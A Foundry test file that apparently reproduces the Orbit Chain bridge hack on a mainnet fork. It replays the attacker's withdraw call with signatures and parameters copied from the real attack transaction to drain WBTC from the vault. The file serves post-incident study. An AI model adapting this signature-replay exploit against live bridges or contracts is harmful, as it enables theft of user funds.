// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~81M
// Attacker : https://etherscan.io/address/0x9263e7873613ddc598a701709875634819176aff
// Vulnerable Contract : https://etherscan.io/address/0x1bf68a9d1eaee7826b3593c20a0ca93293cb489a
// Attack Tx (WBTC) : https://explorer.phalcon.xyz/tx/eth/0xe0bada18fdc56dec125c31b1636490f85ba66016318060a066ed7050ff7271f9

// @Analysis
// https://blog.solidityscan.com/orbit-chain-hack-analysis-b71c36a54a69

interface IOrbitBridge {
    function withdraw(
        address hubContract,
        string memory fromChain,
        bytes memory fromAddr,
        address toAddr,
        address token,
        bytes32[] memory bytes32s,
        uint256[] memory uints,
        bytes memory data,
        uint8[] memory v,
        bytes32[] memory r,
        bytes32[] memory s
    ) external;

    function chain() external view returns (string memory);
}

contract ContractTest is Test {
    IERC20 private constant WBTC =
        IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IOrbitBridge private constant OrbitEthVault =
        IOrbitBridge(0x1Bf68A9d1EaEe7826b3593C20a0ca93293cb489a);
    address private constant orbitHubContractAddress =
        0xB5680a55d627c52DE992e3EA52a86f19DA475399;
    address private constant orbitExploiterFromAddr =
        0x9263e7873613DDc598a701709875634819176AfF;
    address private constant orbitExploiterToAddr =
        0x9ca536d01B9E78dD30de9d7457867F8898634049;

    function setUp() public {
        vm.createSelectFork("mainnet", 18908049);
        vm.label(address(WBTC), "WBTC");
        vm.label(address(OrbitEthVault), "OrbitEthVault");
        vm.label(orbitHubContractAddress, "orbitHubContractAddress");
    }

    function testExploit() public {
        deal(address(WBTC), orbitExploiterToAddr, 0);
        emit log_named_decimal_uint(
            "Exploiter WBTC balance before attack",
            WBTC.balanceOf(orbitExploiterToAddr),
            WBTC.decimals()
        );
        // At first exploiter has deposited some WBTC tokens (acquired from Uniswap) to Orbit in tx:
        // https://explorer.phalcon.xyz/tx/eth/0x9d1351ca4ede8b36ca9cd9f9c46e3b08890d13d94dfd3074d9bb66bbcc2629b1

        // Hash of the tx from Orbit chain. Details can be found at https://bridge.orbitchain.io/ explorer
        bytes32 orbitTxHash = 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa;
        bytes32[] memory bytes32s = new bytes32[](2);
        bytes32s[0] = sha256(
            abi.encodePacked(
                orbitHubContractAddress,
                OrbitEthVault.chain(),
                address(OrbitEthVault)
            )
        );
        bytes32s[1] = orbitTxHash;

        // Values specific to fake signatures from attack tx
        uint256[] memory uints = new uint256[](3);
        uints[0] = 23_087_900_000; // token withdraw amount
        uints[1] = WBTC.decimals();
        uints[2] = 8_735; // unique identifier for requesting bridging ex, depositId

        // v, r, s signature values from attack tx
        uint8[] memory v = new uint8[](7);
        v[0] = 27;
        v[1] = 28;
        v[2] = 28;
        v[3] = 27;
        v[4] = 28;
        v[5] = 28;
        v[6] = 27;

        bytes32[] memory r = new bytes32[](7);
        r[
            0
        ] = 0x3ef06a27b3565a82b6d72af184ca3d787e3dd8fc0bd56bb0e7dce2faf920257d;
        r[
            1
        ] = 0xf1d81597f32c9376e90d22b9a1f121f1a99a1c191f8e930ed0de6df7b759a154;
        r[
            2
        ] = 0x3b7169e2ee2b73dcfbabae1400b811b95616cb5dc547b8b7b7c6aeb37b5b906b;
        r[
            3
        ] = 0xd4b7fd0617b28e1eeb018e1dbf924e662d1a0520cad96af2fcf496e16f4c58c6;
        r[
            4
        ] = 0xe06c17f1a6630bfa47f0fe0cfba02f40f0901e2412713e4c7f46ae17a25dc92c;
        r[
            5
        ] = 0xdecb2622da70fee1c343b93dc946eb855fd32c59b293c0765cb94a71e62aeff3;
        r[
            6
        ] = 0xff7c705149017ce467d05717eadb0a2718aedc7a1799ad153d05e8fc48be853e;

        bytes32[] memory s = new bytes32[](7);
        s[
            0
        ] = 0x0cc266abfa2ba924ffa7dab0cd8f7bb1a14891ec74dea53927c09296d1c6ac7c;
        s[
            1
        ] = 0x739fe72bab59a2eead1e36fdf71441e0407332c508165e460a2cde5418858e1b;
        s[
            2
        ] = 0x18303ee09818b0575ea4a5c2ed25b1e78523aa2b387a9c7c9c23b0d906ff9e07;
        s[
            3
        ] = 0x37da521031f0a65dd8466d4def41c44a69796f696965c42f9705447286c0ac9a;
        s[
            4
        ] = 0x5443cf63033ab211f205076622b2426b994ce3706c1ee2464a68ef168c7639bb;
        s[
            5
        ] = 0x725fa18d06acb4f6f8a5b143bca088d76f77d9531765dea6799b484373d0641b;
        s[
            6
        ] = 0x6b6ddbaaafc5f0580b670ad9d0913ca4c60df2753151a499117086aa725cf2c7;

        OrbitEthVault.withdraw(
            orbitHubContractAddress,
            "ORBIT",
            abi.encodePacked(orbitExploiterFromAddr),
            orbitExploiterToAddr,
            address(WBTC),
            bytes32s,
            uints,
            "",
            v,
            r,
            s
        );

        emit log_named_decimal_uint(
            "Exploiter WBTC balance after attack",
            WBTC.balanceOf(orbitExploiterToAddr),
            WBTC.decimals()
        );
    }
}
